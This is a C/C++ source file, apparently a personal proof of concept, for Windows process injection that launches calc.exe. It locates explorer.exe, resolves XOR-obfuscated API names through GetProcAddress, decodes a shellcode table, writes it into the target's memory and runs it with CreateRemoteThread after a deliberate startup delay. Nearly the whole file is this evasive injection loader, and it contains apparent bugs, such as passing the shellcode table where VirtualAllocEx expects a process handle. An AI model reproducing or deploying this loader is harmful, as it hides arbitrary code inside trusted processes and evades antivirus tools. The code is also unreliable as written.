/*
    Author:     lemur
    Github:     https://github.com/1emvr
    Email:      1emvr@protonmail.com
    Date:       01.10.2023  17:33 PM

    Process injection proof of concept (calc.exe)
    Prototypes and definitions from: https://learn.microsoft.com/en-us/windows/win32/api
*/
#include <Windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <synchapi.h>
#include <stdio.h>
#include <stdlib.h>

#include <cstdint>
#include "resource.h"

typedef HANDLE(WINAPI* OpenProcess_t)(

    DWORD dwDesiredAccess,
    BOOL bInheritHandle,
    DWORD dwProcessId
    );
typedef LPVOID(WINAPI* VirtualAllocEx_t)(

    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
    );
typedef BOOL(WINAPI* WriteProcessMemory_t)(

    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T* lpNumberOfBytesWritten
    );
typedef HANDLE(WINAPI* CreateRemoteThread_t)(

    HANDLE hProcess,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId
    );

char XORCipher(u_char* data, int datalen, u_char* key, int keylen) {

    int j = 0;
    for (int i = 0; i < datalen; i++) {
        if (j == keylen - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
    printf("[+] XOR Parsed\n");
    return *data;
}

HANDLE FindProcess(const char processName[]) {

    int pid = 0;
    printf("[+] FindProcess Entry\n");

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    printf("[+] Snapshot created\n");

    if (INVALID_HANDLE_VALUE == hSnapshot) {
        printf("[!!] Error: Invalid Snapshot\n");
        return 0;
    }
    else { printf("[+] Process handle created\n"); }

    PROCESSENTRY32 processListEntry;
    processListEntry.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &processListEntry)) {
        printf("[*] Error parsing process table\n");
        CloseHandle(hSnapshot);
        return 0;
    }
    while (Process32Next(hSnapshot, &processListEntry)) {
        if (lstrcmpiA(processName, (LPCSTR)processListEntry.szExeFile) == 0) {
            printf("[*] PID Found for %s\n", processName);
            pid = processListEntry.th32ProcessID;
            break;
        }
        else { printf("[*] Iterating processes\n"); }
    }
    CloseHandle(hSnapshot);
    printf("[-] Closing snapshot handle\n");

    if (pid) {
        
        printf("%s PID = %d\n", processName, pid);
        XORCipher(sOpenProcessXORed, sizeof(sOpenProcessXORed), UB_fht, sizeof(UB_fht));
        OpenProcess_t pOpenProcess = (OpenProcess_t)GetProcAddress(GetModuleHandle((LPCWSTR)"kernel32.dll"), (LPCSTR)sOpenProcessXORed);
        printf("[+] Process retreived");

        return pOpenProcess(
            PROCESS_CREATE_THREAD /* | PROCESS_QUERY_INFORMATION */| PROCESS_VM_OPERATION /* | PROCESS_VM_READ | PROCESS_VM_WRITE */, FALSE, (DWORD)pid
        );
    }
    else { printf("[!!] Error opening process %s\n", processName); }

    return NULL;
}

int InjectPayload(HANDLE hProcess, u_char* Table, u_int TableSize) {

    // VirtualAllocEx
    LPVOID pRemoteShellcode = NULL;
    XORCipher(sVirtualAllocExXORed, sizeof(sVirtualAllocExXORed), UB_fht, sizeof(UB_fht));
    VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t)GetProcAddress(GetModuleHandle((LPCWSTR)"kernel32.dll"), (LPCSTR)sVirtualAllocExXORed);
    pRemoteShellcode = pVirtualAllocEx(Table, NULL, TableSize, MEM_COMMIT, PAGE_EXECUTE_READ);
    printf("[+] Memory allocated\n");

    // WriteProcessMemory
    XORCipher(sWriteProcessMemoryXORed, sizeof(sWriteProcessMemoryXORed), UB_fht, sizeof(UB_fht));
    WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddress(GetModuleHandle((LPCWSTR)"kernel32.dll"), (LPCSTR)sWriteProcessMemoryXORed);
    XORCipher(Table, TableSize, UB_fht, sizeof(UB_fht));
    pWriteProcessMemory(hProcess, pRemoteShellcode, Table, TableSize, NULL);
    printf("[+] Process memory written\n");

    // CreateRemoteThread
    HANDLE hThread = NULL;
    XORCipher(sCreateRemoteThreadXORed, sizeof(sCreateRemoteThreadXORed), UB_fht, sizeof(UB_fht));
    CreateRemoteThread_t pCreateRemoteThread = (CreateRemoteThread_t)GetProcAddress(GetModuleHandle((LPCWSTR)"kernel32.dll"), (LPCSTR)sCreateRemoteThreadXORed);
    hThread = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteShellcode, NULL, 0, NULL);
    printf("[+] Remote thread created\n");

    if (hThread != NULL) {
  
        WaitForSingleObject(hThread, INFINITE);
        printf("[*] Waiting for target process\n");
        CloseHandle(hThread);
        printf("[!] Thread executed\n");
        return 0;
    }
    return -1;
}
int main() {
//int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR LpCmdLine, int nCmdShow) {
    
    printf("[+] Entry Main\n");
    printf("[*] Delay exectuion\n");

   Sleep(10000);
    HANDLE hProcess = NULL;

    u_int TableSize = sizeof(_LTABLI);
    hProcess = FindProcess("explorer.exe");

    if (hProcess != NULL) {
        InjectPayload(hProcess, _LTABLI, TableSize);
        CloseHandle(hProcess);
    }
    else { printf("[!!] Error returning process. Process handle returns NULL\n"); }
    return 0;
}
